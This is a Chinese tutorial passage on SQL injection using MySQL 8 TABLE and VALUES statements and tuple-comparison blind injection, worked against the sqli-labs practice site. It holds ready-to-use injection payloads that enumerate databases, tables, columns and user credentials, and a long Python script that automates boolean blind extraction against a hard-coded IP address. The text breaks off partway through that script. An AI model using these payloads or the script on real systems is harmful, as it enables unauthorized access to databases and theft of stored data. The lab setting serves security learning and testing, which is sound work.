<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=-1 union values row(1,2,3);</span><br></pre></td></tr></table></figure>

<p>3.列出所有数据库名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table information_schema.schemata;</span><br></pre></td></tr></table></figure>

<p>4.盲注查询任意表中的内容</p>
<p>语句table users limit 1;的查询结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;  table users limit 1;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | Dumb     | Dumb     |</span><br><span class="line">+------+----------+----------+</span><br></pre></td></tr></table></figure>

<p>实质上是(id, username, password)与(1, ‘Dumb’, ‘Dumb’)进行比较，比较顺序为自左向右，第一列(也就是第一个元组元素)判断正确再判断第二列(也就是第二个元组元素)。<br>两个元组第一个字符比大小，如果第一个字符相等就比第二个字符的大小，以此类推，最终结果即为元组的大小。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ((1,&#x27;&#x27;,&#x27;&#x27;)&lt;(table users limit 1));</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| ((1,&#x27;&#x27;,&#x27;&#x27;)&lt;(table users limit 1)) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ((2,&#x27;&#x27;,&#x27;&#x27;)&lt;(table users limit 1));</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| ((2,&#x27;&#x27;,&#x27;&#x27;)&lt;(table users limit 1)) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 0 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select ((1,&#x27;Du&#x27;,&#x27;&#x27;)&lt;(table users limit 1));</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| ((1,&#x27;Du&#x27;,&#x27;&#x27;)&lt;(table users limit 1)) |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   1 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ((1,&#x27;Dum&#x27;,&#x27;&#x27;)&lt;(table users limit 1));</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| ((1,&#x27;Dum&#x27;,&#x27;&#x27;)&lt;(table users limit 1)) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">|                                    1 |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ((1,&#x27;Dumb&#x27;,&#x27;&#x27;)&lt;(table users limit 1));</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| ((1,&#x27;Dumb&#x27;,&#x27;&#x27;)&lt;(table users limit 1)) |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">|                                     1 |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ((1,&#x27;Dumb&#x27;,&#x27;D&#x27;)&lt;(table users limit 1));</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| ((1,&#x27;Dumb&#x27;,&#x27;D&#x27;)&lt;(table users limit 1)) |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">|                                      1 |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>需要注意的地方<br>1.当前判断的所在列的后一列需要用字符表示，不能用数字，否则判断到当前列的最后一个字符会判断不出！<br><img src="https://blog.cfyqy.com/images/loopholes/sql/6.png" alt="img"><br>2.最好用&lt;=替换&lt;，用&lt;比较一开始并没有问题，但到最后一位时结果为正确字符的前一个字符，用&lt;=结果更直观。<br><img src="https://blog.cfyqy.com/images/loopholes/sql/7.png" alt="img"><br>最终判断过程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ((1,&#x27;Dumb&#x27;,&#x27;Dumb&#x27;)&lt;=(table users limit 1));</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| ((1,&#x27;Dumb&#x27;,&#x27;Dumb&#x27;)&lt;=(table users limit 1)) |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">|                                          1 |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ((1,&#x27;Dumb&#x27;,&#x27;Dumc&#x27;)&lt;=(table users limit 1));</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| ((1,&#x27;Dumb&#x27;,&#x27;Dumc&#x27;)&lt;=(table users limit 1)) |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">|                                          0 |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>例题：在sqli-labs靶场测试</p>
<p>1.判断列数<br>使用经典的order by语句判断：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 3--+   #正常</span><br><span class="line">1&#x27; order by 4--+   #显示Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>

<p>说明有3列</p>
<p>2.使用values判断回显位</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union values row(1,2,3)--+</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210613173053219.png" alt="image-20210613173053219"></p>
<p>3.爆库爆表爆字段爆数据<br>（1）爆当前数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union values row(1,database(),3)--+</span><br><span class="line">#或利用盲注1&#x27; and ascii(substr((database()),1,1))=115--+   即s</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210613173307062.png" alt="image-20210613173307062"></p>
<p>（2）爆所有数据库<br>因为table不能像select控制列数，除非列数一样的表，不然都回显不出来。<br>需要使用table查询配合无列名盲注<br>information_schema.schemata表有6列<br>因为schemata表中的第一列是def，不需要判断，所以可以直接判断库名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (&#x27;def&#x27;,&#x27;m&#x27;,&#x27;&#x27;,4,5,6)&lt;=(table information_schema.schemata limit 1)--+ #回显正常</span><br><span class="line">1&#x27; and (&#x27;def&#x27;,&#x27;n&#x27;,&#x27;&#x27;,4,5,6)&lt;=(table information_schema.schemata limit 1)--+ #回显错误</span><br><span class="line">#得到第1个数据库名的第一个字符为m</span><br><span class="line">......</span><br><span class="line">1&#x27; and (&#x27;def&#x27;,&#x27;mysql&#x27;,&#x27;&#x27;,4,5,6)&lt;=(table information_schema.schemata limit 1)--+ #回显正常</span><br><span class="line">1&#x27; and (&#x27;def&#x27;,&#x27;mysqm&#x27;,&#x27;&#x27;,4,5,6)&lt;=(table information_schema.schemata limit 1)--+ #回显错误</span><br></pre></td></tr></table></figure>

<p>说明第1个数据库名为mysql</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (&#x27;def&#x27;,&#x27;information_schema&#x27;,&#x27;&#x27;,4,5,6)&lt;=(table information_schema.schemata limit 1,1)--+ #回显正常</span><br><span class="line">1&#x27; and (&#x27;def&#x27;,&#x27;information_schemb&#x27;,&#x27;&#x27;,4,5,6)&lt;=(table information_schema.schemata limit 1,1)--+ #回显错误</span><br><span class="line">#说明第2个数据库名为information_schema</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>一直猜解，直到获得全部数据库名<br>（3）爆数据表<br>information_schema.tables表有21列</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (&#x27;def&#x27;,&#x27;security&#x27;,&#x27;users&#x27;,&#x27;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit 317,1)--+ #第一个表users</span><br><span class="line"></span><br><span class="line">1&#x27; and (&#x27;def&#x27;,&#x27;security&#x27;,&#x27;emails&#x27;,&#x27;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit 318,1)--+ #第二个表emails</span><br><span class="line"></span><br><span class="line">1&#x27; and (&#x27;def&#x27;,&#x27;security&#x27;,&#x27;uagents&#x27;,&#x27;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit 319,1)--+ #第三个表uagents</span><br><span class="line"></span><br><span class="line">1&#x27; and (&#x27;def&#x27;,&#x27;security&#x27;,&#x27;referers&#x27;,&#x27;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit 320,1)--+ #第四个表referers</span><br></pre></td></tr></table></figure>

<p>前两个字段都是确定的，可以写一个for循环判断，如果结果为真，代表从那行开始(这里是limit 317,1，即第318行)，然后盲注第三个列。<br>（4）爆字段名<br>information_schema.columns表有22列<br>得到所有表名后开始判断字段名，找到columns表，具体方法和上面一样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (&#x27;def&#x27;,&#x27;security&#x27;,&#x27;users&#x27;,&#x27;id&#x27;,&#x27;&#x27;,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;=(table information_schema.columns limit 3386,1)--+ #users表第一个字段为id</span><br><span class="line"></span><br><span class="line">1&#x27; and (&#x27;def&#x27;,&#x27;security&#x27;,&#x27;users&#x27;,&#x27;password&#x27;,&#x27;&#x27;,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;=(table information_schema.columns limit 3387,1)--+ #users表，第二个字段为password</span><br><span class="line"></span><br><span class="line">1&#x27; and (&#x27;def&#x27;,&#x27;security&#x27;,&#x27;users&#x27;,&#x27;username&#x27;,&#x27;&#x27;,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;=(table information_schema.columns limit 3388,1)--+ #users表，第三个字段为username</span><br></pre></td></tr></table></figure>

<p>（3）爆数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (1,&#x27;D&#x27;,&#x27;&#x27;)&lt;=(table users limit 1)--+ #正常</span><br><span class="line">1&#x27; and (1,&#x27;E&#x27;,&#x27;&#x27;)&lt;=(table users limit 1)--+ #错误</span><br><span class="line"></span><br><span class="line">#table users limit 1也就是table users limit 0,1</span><br><span class="line">#1&#x27; and (1,&#x27;D&#x27;,&#x27;&#x27;)&lt;=(table users limit 0,1)--+ #正常</span><br><span class="line">#1&#x27; and (1,&#x27;E&#x27;,&#x27;&#x27;)&lt;=(table users limit 0,1)--+ #错误</span><br><span class="line">......</span><br><span class="line">1&#x27; and (1,&#x27;Dumb&#x27;,&#x27;Dumb&#x27;)&lt;=(table users limit 1)--+ #正常</span><br><span class="line">1&#x27; and (1,&#x27;Dumb&#x27;,&#x27;Dumc&#x27;)&lt;=(table users limit 1)--+ #错误</span><br></pre></td></tr></table></figure>

<p>得到第1个记录为1 Dumb Dumb</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (8,&#x27;admin&#x27;,&#x27;admin&#x27;)&lt;=(table users limit 7,1)--+ #正常</span><br><span class="line">1&#x27; and (8,&#x27;admin&#x27;,&#x27;admio&#x27;)&lt;=(table users limit 7,1)--+ #错误</span><br></pre></td></tr></table></figure>

<p>得到第8个记录为8 admin admin<br>一步一步注出数据</p>
<p>脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">@desc 本脚本是用于mysql 8新特性的sql注入</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url = &#x27;http://121.41.231.75:8002/Less-8/?id=&#x27;</span><br><span class="line">chars=string.ascii_letters+string.digits+&quot;@&#123;&#125;_-?&quot;</span><br><span class="line"></span><br><span class="line">def current_db(url):</span><br><span class="line">    print(&quot;利用mysql8新特性或普通布尔盲注:\n1.新特性(联合查询) 2.普通布尔盲注&quot;)</span><br><span class="line">    print(&quot;请输入序号:&quot;,end=&#x27;&#x27;)</span><br><span class="line">    num = int(input())</span><br><span class="line">    if num == 1:</span><br><span class="line">        payload = &quot;-1&#x27; union values row(1,database(),3)--+&quot;  #联合查询爆当前数据库(可修改)</span><br><span class="line">        urls = url + payload</span><br><span class="line">        r = requests.get(url=urls)</span><br><span class="line">        print(r.text)</span><br><span class="line">    else:</span><br><span class="line">        name=&#x27;&#x27;</span><br><span class="line">        payload = &quot;1&#x27; and ascii(substr((database()),&#123;0&#125;,1))=&#123;1&#125;--+&quot; #布尔盲注爆当前数据库(可修改)</span><br><span class="line">        for i in range(1,40):</span><br><span class="line">            char=&#x27;&#x27;</span><br><span class="line">            for j in chars:</span><br><span class="line">                payloads = payload.format(i,ord(j))</span><br><span class="line">                urls = url + payloads</span><br><span class="line">                r = requests.get(url=urls)</span><br><span class="line">                if &quot;You are in&quot; in r.text:</span><br><span class="line">                    name += j</span><br><span class="line">                    print(name)</span><br><span class="line">                    char = j</span><br><span class="line">                    break</span><br><span class="line">            if char == &#x27;&#x27;:</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">def str2hex(name):</span><br><span class="line">    res = &#x27;&#x27;</span><br><span class="line">    for i in name:</span><br><span class="line">        res += hex(ord(i))</span><br><span class="line">    res = &#x27;0x&#x27; + res.replace(&#x27;0x&#x27;,&#x27;&#x27;)</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">def dbs(url): #无列名盲注爆所有数据库(可修改)</span><br><span class="line">    while True:</span><br><span class="line">        print(&quot;请输入要爆第几个数据库，如：1,2等:&quot;,end=&#x27;&#x27;)</span><br><span class="line">        x = int(input())-1</span><br><span class="line">        num = str(x)</span><br><span class="line">        if x &lt; 0:</span><br><span class="line">            break</span><br><span class="line">        payload = &quot;1&#x27; and (&#x27;def&#x27;,&#123;&#125;,&#x27;&#x27;,4,5,6)&gt;(table information_schema.schemata limit &quot;+num+&quot;,1)--+&quot;</span><br><span class="line">        name = &#x27;&#x27;</span><br><span class="line">        for i in range(1,20):</span><br><span class="line">            hexchar = &#x27;&#x27;</span><br><span class="line">            for char in range(32, 126):</span><br><span class="line">                hexchar = str2hex(name + chr(char))</span><br><span class="line">                payloads = payload.format(hexchar)</span><br><span class="line">                #print(payloads)</span><br><span class="line">                urls = url + payloads</span><br><span class="line">                r = requests.get(url=urls)</span><br><span class="line">                if &#x27;You are in&#x27; in r.text:</span><br><span class="line">                    name += chr(char-1)</span><br><span class="line">                    print(name)</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">def tables_n(url,database): #无列名盲注爆数据表开始行数(可修改)</span><br><span class="line">    payload = &quot;1&#x27; and (&#x27;def&#x27;,&#x27;&quot;+database+&quot;&#x27;,&#x27;&#x27;,&#x27;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit &#123;&#125;,1)--+&quot;</span><br><span class="line">    for i in range(0,10000):</span><br><span class="line">        payloads = payload.format(i)</span><br><span class="line">        urls = url + payloads</span><br><span class="line">        r = requests.get(url=urls)</span><br><span class="line">        if &#x27;You are in&#x27; in r.text:</span><br><span class="line">            char = chr(ord(database[-1])+1)</span><br><span class="line">            database = database[0:-1]+char</span><br><span class="line">            payld = &quot;1&#x27; and (&#x27;def&#x27;,&#x27;&quot;+database+&quot;&#x27;,&#x27;&#x27;,&#x27;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit &quot;+str(i)+&quot;,1)--+&quot;</span><br><span class="line">            urls = url + payld</span><br><span class="line">            res = requests.get(url=urls)</span><br><span class="line">            #print(i)</span><br><span class="line">            if &#x27;You are in&#x27; not in res.text:</span><br><span class="line">                print(&#x27;从第&#x27;,i,&#x27;行开始爆数据表&#x27;)   #判断开始行数</span><br><span class="line">                n = i</span><br><span class="line">                break</span><br><span class="line">    return n</span><br><span class="line"></span><br><span class="line">def tables(url,database,n):  #无列名盲注爆数据表(可修改)</span><br><span class="line">    while True:</span><br><span class="line">        print(&quot;请输入要爆第几个数据表，如：1,2等:&quot;,end=&#x27;&#x27;)</span><br><span class="line">        x = int(input())-1</span><br><span class="line">        num = str(x + n)</span><br><span class="line">        if x &lt; 0:</span><br><span class="line">            break</span><br><span class="line">        payload = &quot;1&#x27; and (&#x27;def&#x27;,&#x27;&quot;+database+&quot;&#x27;,&#123;&#125;,&#x27;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&gt;(table information_schema.tables limit &quot;+num+&quot;,1)--+&quot;</span><br><span class="line">        name = &#x27;&#x27;</span><br><span class="line">        for i in range(1,20):</span><br><span class="line">            hexchar = &#x27;&#x27;</span><br><span class="line">            for char in range(32, 126):</span><br><span class="line">                hexchar = str2hex(name + chr(char))</span><br><span class="line">                payloads = payload.format(hexchar)</span><br><span class="line">                #print(payloads)</span><br><span class="line">                urls = url + payloads</span><br><span class="line">                r = requests.get(url=urls)</span><br><span class="line">                if &#x27;You are in&#x27; in r.text:</span><br><span class="line">                    name += chr(char-1)</span><br><span class="line">                    print(name)</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">def columns_n(url,database,table): #无列名盲注爆字段开始行数(可修改)</span><br><span class="line">    payload = &quot;1&#x27; and (&#x27;def&#x27;,&#x27;&quot;+database+&quot;&#x27;,&#x27;&quot;+table+&quot;&#x27;,&#x27;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit &#123;&#125;,1)--+&quot;</span><br><span class="line">    for i in range(3000,10000):</span><br><span class="line">        payloads = payload.format(i)</span><br><span class="line">        urls = url + payloads</span><br><span class="line">        r = requests.get(url=urls)</span><br><span class="line">        if &#x27;You are in&#x27; in r.text:</span><br><span class="line">            char = chr(ord(table[-1])+1)</span><br><span class="line">            table = table[0:-1]+char</span><br><span class="line">            payld = &quot;1&#x27; and (&#x27;def&#x27;,&#x27;&quot;+database+&quot;&#x27;,&#x27;&quot;+table+&quot;&#x27;,&#x27;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit &quot;+str(i)+&quot;,1)--+&quot;</span><br><span class="line">            urls = url + payld</span><br><span class="line">            res = requests.get(url=urls)</span><br><span class="line">            #print(i)</span><br><span class="line">            if &#x27;You are in&#x27; not in res.text:</span><br><span class="line">                print(&#x27;从第&#x27;,i,&#x27;行开始爆字段&#x27;)   #判断开始行数</span><br><span class="line">                n = i</span><br><span class="line">                break</span><br><span class="line">    return n</span><br><span class="line"></span><br><span class="line">def columns(url,database,table,n):  #无列名盲注爆字段值(可修改)</span><br><span class="line">    while True:</span><br><span class="line">        print(&quot;请输入要爆第几个字段，如：1,2等:&quot;,end=&#x27;&#x27;)</span><br><span class="line">        x = int(input())-1</span><br><span class="line">        num = str(x + n)</span><br><span class="line">        if x &lt; 0:</span><br><span class="line">            break</span><br><span class="line">        payload = &quot;1&#x27; and (&#x27;def&#x27;,&#x27;&quot;+database+&quot;&#x27;,&#x27;&quot;+table+&quot;&#x27;,&#123;&#125;,&#x27;&#x27;,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&gt;(table information_schema.columns limit &quot;+num+&quot;,1)--+&quot;</span><br><span class="line">        name = &#x27;&#x27;</span><br><span class="line">        for i in range(1,20):</span><br><span class="line">            hexchar = &#x27;&#x27;</span><br><span class="line">            for char in range(32, 126):</span><br><span class="line">                hexchar = str2hex(name + chr(char))</span><br><span class="line">                payloads = payload.format(hexchar)</span><br><span class="line">                #print(payloads)</span><br><span class="line">                urls = url + payloads</span><br><span class="line">                r = requests.get(url=urls)</span><br><span class="line">                if &#x27;You are in&#x27; in r.text:</span><br><span class="line">                    name += chr(char-1)</span><br><span class="line">                    print(name)</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">def datas(url,table):  #无列名盲注爆数据(可修改)</span><br><span class="line">    while True:</span><br><span class="line">        print(&quot;请输入要爆第几个数据，如：1,2等:&quot;,end=&#x27;&#x27;)</span><br><span class="line">        x = int(input())</span><br><span class="line">        y = x-1</span><br><span class="line">        num = str(y)</span><br><span class="line">        if y &lt; 0:</span><br><span class="line">            break</span><br><span class="line">        payload = &quot;1&#x27; and (&quot;+str(x)+&quot;,&#123;&#125;,&#x27;&#x27;)&gt;(table &quot;+table+&quot; limit &quot;+num+&quot;,1)--+&quot;</span><br><span class="line">        name = &#x27;&#x27;</span><br><span class="line">        for i in range(1,20):</span><br><span class="line">            hexchar = &#x27;&#x27;</span><br><span class="line">            for char in range(32, 126):</span><br><span class="line">                hexchar = str2hex(name + chr(char))</span><br><span class="line">                payloads = payload.format(hexchar)</span><br><span class="line">                #print(payloads)</span><br><span class="line">                urls = url + payloads</span><br><span class="line">                r = requests.get(url=urls)</span><br><span class="line">                if &#x27;You are in&#x27; in r.text:</span><br><span class="line">                    name += chr(char-1)</span><br><span class="line">                    print(name)</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    while True:</span><br><span class="line">        print(&quot;请输入要操作的内容：\n1.爆当前数据库\n2.爆数据表开始行号\n3.爆数据表\n4.爆字段值开始行号\n5.爆字段值\n6.爆数据\n7.爆所有数据库&quot;)</span><br><span class="line">        types = int(input())</span><br><span class="line">        if types == 1:</span><br><span class="line">            current_db(url)</span><br><span class="line">        elif types == 2 or types == 3:</span><br><span class="line">            print(&quot;请输入已经得到的数据库名:&quot;,end=&#x27;&#x27;)</span><br><span class="line">            database = input()</span><br><span class="line">            if types == 2:</span><br><span class="line">                tables_n(url,database)</span><br><span class="line">            elif types == 3:</span><br><span class="line">                print(&quot;爆数据表开始行号:&quot;,end=&#x27;&#x27;)</span><br><span class="line">                n = int(input())</span><br><span class="line">                tables(url,database,n)</span><br><span class="line">        elif types == 4 or types == 5:</span><br><span class="line">            print(&quot;请输入已经得到的数据库名:&quot;,end=&#x27;&#x27;)</span><br><span class="line">            database = input()</span><br><span 